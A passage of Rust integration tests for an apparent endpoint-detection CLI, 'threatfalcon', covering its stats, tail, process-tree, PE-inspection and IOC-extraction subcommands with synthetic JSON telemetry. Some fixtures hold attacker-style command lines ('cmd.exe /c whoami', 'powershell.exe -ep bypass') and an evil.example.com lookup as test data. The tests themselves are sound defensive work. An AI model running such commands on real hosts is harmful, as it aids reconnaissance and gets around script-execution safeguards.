        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_detection_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "TF-EVA-001"),
        sample_detection_event("cccccccc-cccc-cccc-cccc-cccccccccccc", "TF-EVA-001"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["stats", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("Detection Rules")
                .and(predicate::str::contains("TF-EVA-001"))
                .and(predicate::str::contains("2")),
        );
}

#[test]
fn stats_json_output() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["stats", "--input", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    let json: serde_json::Value = serde_json::from_str(&stdout).expect("stats --json should output valid JSON");
    assert_eq!(json["total_events"], 2);
    assert!(json["by_category"].is_array());
    assert!(json["by_severity"].is_array());
    assert!(json["by_source"].is_array());
    assert!(json["top_processes"].is_array());
    assert!(json["time_range"].is_object());
}

#[test]
fn stats_empty_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("empty.jsonl");
    fs::write(&path, "").unwrap();

    cmd()
        .args(["stats", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("Total events: 0"));
}

#[test]
fn stats_pid_reuse_separates_by_process_key() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Same PID 100, but two different process_keys (PID reuse)
    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:1000", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "100:1000", "Network", "Info", "2026-03-13T10:01:00Z"),
        sample_etw_event("cccccccc-cccc-cccc-cccc-cccccccccccc", 100, "100:2000", "Network", "Info", "2026-03-13T10:05:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["stats", "--input", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();

    // Should have 2 separate process entries (not merged into one PID 100 bucket)
    let procs = json["top_processes"].as_array().unwrap();
    assert_eq!(procs.len(), 2, "PID-reused processes should be separate entries");

    // First entry has 2 events, second has 1
    assert_eq!(procs[0]["count"], 2);
    assert_eq!(procs[0]["process_key"], "100:1000");
    assert_eq!(procs[1]["count"], 1);
    assert_eq!(procs[1]["process_key"], "100:2000");
}

// ---- Tail subcommand tests --------------------------------------------------

#[test]
fn tail_help() {
    cmd().args(["tail", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--pid"))
            .and(predicate::str::contains("--category"))
            .and(predicate::str::contains("--severity"))
            .and(predicate::str::contains("--source"))
            .and(predicate::str::contains("--contains"))
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_tail_subcommand() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("tail"),
    );
}

#[test]
fn tail_picks_up_appended_events() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Start with an existing file
    fs::write(&path, "").unwrap();

    let path_str = path.to_str().unwrap().to_string();

    // Spawn tail in background, then append events, then kill it
    let mut child = std::process::Command::new(assert_cmd::cargo::cargo_bin("threatfalcon"))
        .args(["tail", "--input", &path_str, "--json"])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    // Give tail a moment to start and seek to end
    std::thread::sleep(std::time::Duration::from_millis(500));

    // Append events to the file
    {
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
        let event = sample_etw_event(
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z",
        );
        writeln!(f, "{event}").unwrap();
    }

    // Wait for tail to pick it up (> 1 second poll interval)
    std::thread::sleep(std::time::Duration::from_millis(2000));

    // Kill the tail process
    child.kill().unwrap();
    let output = child.wait_with_output().unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(
        stdout.contains("aaaaaaaa"),
        "tail should have output the appended event, got: {stdout}"
    );
}

#[test]
fn tail_applies_filters() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    fs::write(&path, "").unwrap();

    let path_str = path.to_str().unwrap().to_string();

    // Spawn tail with --severity high filter
    let mut child = std::process::Command::new(assert_cmd::cargo::cargo_bin("threatfalcon"))
        .args(["tail", "--input", &path_str, "--json", "--severity", "high"])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    std::thread::sleep(std::time::Duration::from_millis(500));

    // Append both Info and High events
    {
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
        let info_event = sample_etw_event(
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z",
        );
        let high_event = sample_evasion_event(
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "High", "2026-03-13T10:01:00Z",
        );
        writeln!(f, "{info_event}").unwrap();
        writeln!(f, "{high_event}").unwrap();
    }

    std::thread::sleep(std::time::Duration::from_millis(2000));

    child.kill().unwrap();
    let output = child.wait_with_output().unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    // Should contain only the High event, not the Info one
    assert!(
        stdout.contains("bbbbbbbb"),
        "tail should output the high severity event"
    );
    assert!(
        !stdout.contains("aaaaaaaa"),
        "tail should filter out the Info event"
    );
}

#[test]
fn tail_skips_existing_content() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Write an existing event before starting tail
    let existing = sample_etw_event(
        "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee",
        999, "999:99", "Network", "Info", "2026-03-13T09:00:00Z",
    );
    fs::write(&path, format!("{existing}\n")).unwrap();

    let path_str = path.to_str().unwrap().to_string();

    let mut child = std::process::Command::new(assert_cmd::cargo::cargo_bin("threatfalcon"))
        .args(["tail", "--input", &path_str, "--json"])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    std::thread::sleep(std::time::Duration::from_millis(500));

    // Append a new event
    {
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
        let new_event = sample_etw_event(
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z",
        );
        writeln!(f, "{new_event}").unwrap();
    }

    std::thread::sleep(std::time::Duration::from_millis(2000));

    child.kill().unwrap();
    let output = child.wait_with_output().unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    // Should NOT contain the pre-existing event
    assert!(
        !stdout.contains("eeeeeeee"),
        "tail should skip pre-existing content"
    );
    // Should contain the newly appended event
    assert!(
        stdout.contains("ffffffff"),
        "tail should show newly appended event"
    );
}

#[test]
fn tail_survives_file_rotation() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Write some initial content so there's something to rotate away
    let initial = sample_etw_event(
        "11111111-1111-1111-1111-111111111111",
        100, "100:42", "Network", "Info", "2026-03-13T09:00:00Z",
    );
    fs::write(&path, format!("{initial}\n")).unwrap();

    let path_str = path.to_str().unwrap().to_string();

    let mut child = std::process::Command::new(assert_cmd::cargo::cargo_bin("threatfalcon"))
        .args(["tail", "--input", &path_str, "--json"])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();

    std::thread::sleep(std::time::Duration::from_millis(500));

    // Simulate file rotation: rename the current file and create a new one
    let rotated = dir.path().join("events.jsonl.1");
    fs::rename(&path, &rotated).unwrap();

    // Create the new file with a post-rotation event
    let post_rotation = sample_etw_event(
        "22222222-2222-2222-2222-222222222222",
        200, "200:43", "Network", "Info", "2026-03-13T10:00:00Z",
    );
    fs::write(&path, format!("{post_rotation}\n")).unwrap();

    // Wait for tail to detect rotation and read the new file
    std::thread::sleep(std::time::Duration::from_millis(3000));

    child.kill().unwrap();
    let output = child.wait_with_output().unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    // Should NOT contain the pre-rotation event
    assert!(
        !stdout.contains("11111111"),
        "tail should not show pre-existing content"
    );
    // Should contain the post-rotation event from the new file
    assert!(
        stdout.contains("22222222"),
        "tail should pick up events from the new file after rotation, got: {stdout}"
    );
}

// ---- Tree subcommand tests --------------------------------------------------

fn sample_process_create(id: &str, pid: u32, ppid: u32, image: &str, cmdline: &str, timestamp: &str) -> String {
    sample_process_create_key(id, pid, ppid, image, cmdline, timestamp, &format!("{pid}:42"))
}

fn sample_process_create_key(id: &str, pid: u32, ppid: u32, image: &str, cmdline: &str, timestamp: &str, process_key: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Process"}}}},"category":"Process","severity":"Info","data":{{"type":"ProcessCreate","pid":{pid},"ppid":{ppid},"image_path":"{image}","command_line":"{cmdline}","user":"TEST\\\\user","integrity_level":"Medium","hashes":null}},"process_context":{{"process_key":"{process_key}"}}}}"#
    )
}

#[test]
fn tree_help() {
    cmd().args(["tree", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--pid"))
            .and(predicate::str::contains("--process-key"))
            .and(predicate::str::contains("--ancestors"))
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_tree_subcommand() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("tree"),
    );
}

#[test]
fn tree_shows_descendants() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // explorer (PID 1) → cmd (PID 100) → powershell (PID 200)
    let lines = [
        sample_process_create("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 1, 0, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, 1, "C:/Windows/System32/cmd.exe", "cmd.exe /c whoami", "2026-03-13T10:01:00Z"),
        sample_process_create("cccccccc-cccc-cccc-cccc-cccccccccccc", 200, 100, "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "powershell.exe -ep bypass", "2026-03-13T10:02:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "1"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    assert!(stdout.contains("Process Tree for PID 1"), "header missing");
    assert!(stdout.contains("2 descendants"), "descendant count missing");
    assert!(stdout.contains("explorer.exe"), "root process missing");
    assert!(stdout.contains("cmd.exe"), "child process missing");
    assert!(stdout.contains("powershell.exe"), "grandchild process missing");
    // Verify tree connectors are present (not flat output)
    assert!(
        stdout.contains("└─") || stdout.contains("├─"),
        "tree connectors missing — output is flat: {stdout}"
    );
}

#[test]
fn tree_shows_ancestors() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 1, 0, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, 1, "C:/Windows/System32/cmd.exe", "cmd.exe /c whoami", "2026-03-13T10:01:00Z"),
        sample_process_create("cccccccc-cccc-cccc-cccc-cccccccccccc", 200, 100, "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "powershell.exe -ep bypass", "2026-03-13T10:02:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "200", "--ancestors"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("Ancestor Chain for PID 200")
                .and(predicate::str::contains("3 levels"))
                .and(predicate::str::contains("explorer.exe"))
                .and(predicate::str::contains("cmd.exe"))
                .and(predicate::str::contains("powershell.exe")),
        );
}

#[test]
fn tree_json_output() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 1, 0, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, 1, "C:/Windows/System32/cmd.exe", "cmd.exe", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "1", "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    let json: serde_json::Value = serde_json::from_str(&stdout).expect("tree --json should output valid JSON");
    assert_eq!(json["pid"], 1);
    assert_eq!(json["children"][0]["pid"], 100);
}

#[test]
fn tree_pid_not_found() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event = sample_process_create("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 1, 0, "explorer.exe", "explorer.exe", "2026-03-13T10:00:00Z");
    fs::write(&path, &event).unwrap();

    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "999"])
        .assert()
        .failure();
}

#[test]
fn tree_leaf_process_has_no_descendants() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 1, 0, "explorer.exe", "explorer.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, 1, "cmd.exe", "cmd.exe", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "100"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("0 descendants")
                .and(predicate::str::contains("cmd.exe")),
        );
}

#[test]
fn tree_pid_reuse_descendants_picks_correct_instance() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // PID 100 used twice: first as cmd.exe, then later as notepad.exe.
    // PID 200 (child of PID 100) was created after cmd.exe but before notepad.exe.
    let lines = [
        sample_process_create_key("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, 0, "cmd.exe", "cmd.exe", "2026-03-13T10:00:00Z", "100:1000"),
        sample_process_create_key("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, 100, "child.exe", "child.exe", "2026-03-13T10:01:00Z", "200:42"),
        sample_process_create_key("cccccccc-cccc-cccc-cccc-cccccccccccc", 100, 0, "notepad.exe", "notepad.exe", "2026-03-13T10:05:00Z", "100:2000"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Without --process-key, tree picks the latest PID 100 (notepad.exe)
    // and child.exe should NOT appear as its descendant (created before notepad.exe)
    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "100"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("notepad.exe")
                .and(predicate::str::contains("0 descendants")),
        );

    // With --process-key, tree picks the cmd.exe instance and child.exe IS its descendant
    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "100", "--process-key", "100:1000"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("cmd.exe")
                .and(predicate::str::contains("1 descendants"))
                .and(predicate::str::contains("child.exe")),
        );
}

#[test]
fn tree_pid_reuse_ancestors_picks_correct_parent() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // PID 50 used twice: first as svchost.exe (T1), then as notepad.exe (T3).
    // PID 100 (child) has ppid=50, created at T2 (between T1 and T3).
    // Ancestor chain should pick svchost.exe (T1), not notepad.exe (T3).
    let lines = [
        sample_process_create_key("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 50, 0, "svchost.exe", "svchost.exe", "2026-03-13T10:00:00Z", "50:1000"),
        sample_process_create_key("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, 50, "cmd.exe", "cmd.exe", "2026-03-13T10:01:00Z", "100:42"),
        sample_process_create_key("cccccccc-cccc-cccc-cccc-cccccccccccc", 50, 0, "notepad.exe", "notepad.exe", "2026-03-13T10:05:00Z", "50:2000"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Ancestor chain for PID 100 should show svchost.exe as parent (created before cmd.exe)
    cmd()
        .args(["tree", "--input", path.to_str().unwrap(), "--pid", "100", "--ancestors"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("svchost.exe")
                .and(predicate::str::contains("cmd.exe"))
                .and(predicate::str::contains("notepad.exe").not()),
        );
}

// ---- Inspect subcommand tests -----------------------------------------------

/// Build a minimal PE64 binary for testing inspect. Contains a .text section and
/// recognizable PE signature bytes.
fn build_test_pe() -> Vec<u8> {
    let pe_offset: usize = 64;
    let coff = pe_offset + 4;
    let opt = coff + 20;
    let num_dd: usize = 16;
    let opt_size = 112 + num_dd * 8;
    let sec_start = opt + opt_size;
    let file_align: usize = 512;
    let headers_end = sec_start + 1 * 40; // 1 section
    let data_start = (headers_end + file_align - 1) / file_align * file_align;
    let text_data = [0xCCu8; 64];
    let raw_size = (text_data.len() + file_align - 1) / file_align * file_align;
    let total_size = data_start + raw_size;

    let mut buf = vec![0u8; total_size];

    // DOS header
    buf[0] = b'M';
    buf[1] = b'Z';
    buf[0x3C..0x40].copy_from_slice(&(pe_offset as u32).to_le_bytes());

    // PE signature
    buf[pe_offset..pe_offset + 4].copy_from_slice(b"PE\0\0");

    // COFF header: AMD64, 1 section
    buf[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
    buf[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
    buf[coff + 16..coff + 18].copy_from_slice(&(opt_size as u16).to_le_bytes());

    // Optional header: PE32+
    buf[opt..opt + 2].copy_from_slice(&0x020Bu16.to_le_bytes());
    buf[opt + 16..opt + 20].copy_from_slice(&0x1000u32.to_le_bytes()); // entry point
    buf[opt + 24..opt + 32].copy_from_slice(&0x140000000u64.to_le_bytes()); // image base
    buf[opt + 32..opt + 36].copy_from_slice(&0x1000u32.to_le_bytes()); // section align
    buf[opt + 36..opt + 40].copy_from_slice(&(file_align as u32).to_le_bytes());
    buf[opt + 56..opt + 60].copy_from_slice(&0x10000u32.to_le_bytes()); // image size
    buf[opt + 60..opt + 64].copy_from_slice(&(data_start as u32).to_le_bytes());
    buf[opt + 68..opt + 70].copy_from_slice(&3u16.to_le_bytes()); // subsystem: CUI
    buf[opt + 108..opt + 112].copy_from_slice(&(num_dd as u32).to_le_bytes());

    // Section header: .text
    let s = sec_start;
    buf[s..s + 8].copy_from_slice(b".text\0\0\0");
    buf[s + 8..s + 12].copy_from_slice(&(text_data.len() as u32).to_le_bytes());
    buf[s + 12..s + 16].copy_from_slice(&0x1000u32.to_le_bytes());
    buf[s + 16..s + 20].copy_from_slice(&(raw_size as u32).to_le_bytes());
    buf[s + 20..s + 24].copy_from_slice(&(data_start as u32).to_le_bytes());
    let code_chars: u32 = 0x60000020; // CODE | EXECUTE | READ
    buf[s + 36..s + 40].copy_from_slice(&code_chars.to_le_bytes());

    // Section data
    buf[data_start..data_start + text_data.len()].copy_from_slice(&text_data);

    buf
}

#[test]
fn inspect_help() {
    cmd().args(["inspect", "--help"]).assert().success().stdout(
        predicate::str::contains("--file")
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_inspect_subcommand() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("inspect"),
    );
}

#[test]
fn inspect_shows_pe_info() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("test.exe");
    fs::write(&path, build_test_pe()).unwrap();

    cmd()
        .args(["inspect", "--file", path.to_str().unwrap()])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("PE Inspection")
                .and(predicate::str::contains("PE32+ (AMD64)"))
                .and(predicate::str::contains(".text"))
                .and(predicate::str::contains("Windows CUI"))
                .and(predicate::str::contains("[Sections]"))
                .and(predicate::str::contains("[Imports]"))
                .and(predicate::str::contains("[Exports]")),
        );
}

#[test]
fn inspect_json_output() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("test.exe");
    fs::write(&path, build_test_pe()).unwrap();

    let output = cmd()
        .args(["inspect", "--file", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: serde_json::Value = serde_json::from_str(&stdout).expect("inspect --json should output valid JSON");
    assert_eq!(json["architecture"], "PE32+ (AMD64)");
    assert_eq!(json["subsystem"], "Windows CUI");
    assert!(json["sections"].is_array());
    assert!(json["imports"].is_array());
    assert!(json["exports"].is_array());
}

#[test]
fn inspect_invalid_pe() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("notape.bin");
    fs::write(&path, b"this is not a PE file").unwrap();

    cmd()
        .args(["inspect", "--file", path.to_str().unwrap()])
        .assert()
        .failure()
        .stderr(predicate::str::contains("not a valid PE file"));
}

#[test]
fn inspect_missing_file() {
    cmd()
        .args(["inspect", "--file", "/nonexistent/path.exe"])
        .assert()
        .failure();
}

#[test]
fn inspect_malformed_import_table_warns() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("bad_imports.exe");

    // Build a PE that has import data directory pointing at valid offset
    // but the section data is garbage (all 0xFF), so parsing will fail.
    let mut pe = build_test_pe();

    // Point import data directory at .text section (VA 0x1000) which has 0xCC bytes.
    // This is a valid RVA but the data there is not a valid import descriptor.
    let pe_offset = u32::from_le_bytes(pe[0x3C..0x40].try_into().unwrap()) as usize;
    let opt = pe_offset + 4 + 20;
    // Data directory entry 1 (import) is at opt+112+8 for PE32+
    let dd = opt + 112 + 8;
    pe[dd..dd + 4].copy_from_slice(&0x1000u32.to_le_bytes()); // import RVA → .text
    pe[dd + 4..dd + 8].copy_from_slice(&40u32.to_le_bytes()); // size = 40

    fs::write(&path, &pe).unwrap();

    let output = cmd()
        .args(["inspect", "--file", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(
        stdout.contains("could not be parsed"),
        "should warn about malformed import table, got: {stdout}"
    );
}

// ---------------------------------------------------------------------------
// IOC subcommand tests
// ---------------------------------------------------------------------------

fn sample_network_event(id: &str, dst_addr: &str, dst_port: u16, image: &str, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Network"}}}},"category":"Network","severity":"Info","data":{{"type":"NetworkConnect","pid":100,"image_path":"{image}","protocol":"TCP","src_addr":"10.0.0.1","src_port":12345,"dst_addr":"{dst_addr}","dst_port":{dst_port},"direction":"Outbound"}}}}"#
    )
}

fn sample_dns_event(id: &str, query: &str, response: Option<&str>, timestamp: &str) -> String {
    let resp = match response {
        Some(r) => format!(r#","response":"{r}""#),
        None => String::new(),
    };
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-DNS-Client"}}}},"category":"Dns","severity":"Info","data":{{"type":"DnsQuery","pid":100,"query_name":"{query}","query_type":"A"{resp}}}}}"#
    )
}

fn sample_process_create_with_hashes(id: &str, image: &str, hashes: &str, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Process"}}}},"category":"Process","severity":"Info","data":{{"type":"ProcessCreate","pid":200,"ppid":1,"image_path":"{image}","command_line":"{image}","user":"TEST\\\\user","integrity_level":"Medium","hashes":"{hashes}"}}}}"#
    )
}

#[test]
fn ioc_help() {
    cmd().args(["ioc", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--type"))
            .and(predicate::str::contains("--limit"))
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_ioc_subcommand() {
    cmd()
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("ioc"));
}

#[test]
fn ioc_extracts_ips_and_domains() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000001", "93.184.216.34", 443, "C:/Windows/explorer.exe", "2026-03-13T10:00:00Z"),
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000002", "93.184.216.34", 443, "C:/Windows/explorer.exe", "2026-03-13T10:01:00Z"),
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000003", "8.8.8.8", 53, "C:/Windows/svchost.exe", "2026-03-13T10:02:00Z"),
        // Private IP — should be excluded
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000004", "192.168.1.1", 80, "C:/test.exe", "2026-03-13T10:03:00Z"),
        // IPv6 non-public — should all be excluded
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000005", "fc00::1", 443, "C:/test.exe", "2026-03-13T10:03:01Z"),       // unique-local
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000006", "fe80::1", 443, "C:/test.exe", "2026-03-13T10:03:02Z"),       // link-local
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000007", "ff02::1", 443, "C:/test.exe", "2026-03-13T10:03:03Z"),       // multicast
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000008", "2001:db8::1", 443, "C:/test.exe", "2026-03-13T10:03:04Z"),   // documentation
        sample_network_event("a1a1a1a1-0000-0000-0000-000000000009", "::1", 443, "C:/test.exe", "2026-03-13T10:03:05Z"),           // loopback
        // IPv6 public — should be included
        sample_network_event("a1a1a1a1-0000-0000-0000-00000000000a", "2607:f8b0:4004:800::200e", 443, "C:/chrome.exe", "2026-03-13T10:03:06Z"),
        sample_dns_event("b1b1b1b1-0000-0000-0000-000000000001", "evil.example.com", Some("93.184.216.34"), "2026-03-13T10:04:00Z"),
        sample_dns_event("b1b1b1b1-0000-0000-0000-000000000002", "evil.example.com", None, "2026-03-13T10:05:00Z"),
        sample_dns_event("b1b1b1b1-0000-0000-0000-000000000003", "good.example.org", None, "2026-03-13T10:06:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    // Public IPs should appear, private should not
    assert!(stdout.contains("93.184.216.34"), "should contain public IP");
    assert!(stdout.contains("8.8.8.8"), "should contain DNS IP");
    assert!(!stdout.contains("192.168.1.1"), "should exclude private IP");
    // IPv6 non-public should be excluded
    assert!(!stdout.contains("fc00::1"), "should exclude unique-local IPv6");
    assert!(!stdout.contains("fe80::1"), "should exclude link-local IPv6");
    assert!(!stdout.contains("ff02::1"), "should exclude multicast IPv6");
    assert!(!stdout.contains("2001:db8::1"), "should exclude documentation IPv6");
    assert!(!stdout.contains("::1"), "should exclude loopback IPv6");
    // IPv6 public should appear
    assert!(stdout.contains("2607:f8b0:4004:800::200e"), "should contain public IPv6");

    // Domains
    assert!(stdout.contains("evil.example.com"), "should contain queried domain");
    assert!(stdout.contains("good.example.org"), "should contain queried domain");

    // Section headers
    assert!(stdout.contains("[External IPs]"));
    assert!(stdout.contains("[Domains]"));
}

#[test]
fn ioc_extracts_hashes() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create_with_hashes(
            "c1c1c1c1-0000-0000-0000-000000000001",
            "C:/malware.exe",
            "SHA256=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,MD5=d41d8cd98f00b204e9800998ecf8427e",
            "2026-03-13T10:00:00Z",
        ),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    assert!(stdout.contains("SHA256=abcdef"), "should contain SHA256 hash");
    assert!(stdout.contains("MD5=d41d8cd"), "should contain MD5 hash");
    assert!(stdout.contains("[File Hashes]"));
}

#[test]
fn ioc_json_output() {
